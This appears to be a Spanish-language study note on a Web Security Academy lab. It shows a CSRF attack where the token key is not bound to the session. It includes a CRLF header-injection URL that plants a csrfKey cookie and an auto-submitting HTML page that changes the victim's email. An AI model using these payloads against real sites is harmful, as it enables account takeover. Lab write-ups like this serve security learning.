
![[Pasted image 20250225163309.png]]

Las combinaciones de csrf key - csrf token son válidas para cualquier sesión.

Por lo que tenemos que hacer que el usuario primero inyecte la cookie csrf key y luego enviar el csrf token en el post al cambiar el correo.

Para inyectar la cookie, tendría que hacer un fetch a :
```
https://0a10000d0327290d8097fd6400920097.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=VtTjnFHqWa5mjL2xYkF6JNDk3kJsk8oU%3b%20SameSite=None
```

Luego cuando hagamos el csrf , proporcionamos el token:

```html
<html>
  <!-- Añadimos la cookie csrfKey -->
	<script>fetch('https://0a10000d0327290d8097fd6400920097.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=VtTjnFHqWa5mjL2xYkF6JNDk3kJsk8oU%3b%20SameSite=None',{credentials:'include'})</script>
  <!-- Enviamos el csrf token que se corresponde con la key -->
  <body>
    <form action="https://0a10000d0327290d8097fd6400920097.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test0000&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="6L2N9HUMHoG1V1RB1RIYfM6PYPgMQZEb" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

Los navegadores modernos no permiten modificar las cookies porque los navegadores modernos **bloquean la modificación manual de la cabecera `Cookie` desde JavaScript**.

En el contexto de un XSS, podemos crear cookies, pero para el dominio en el que está el XSS.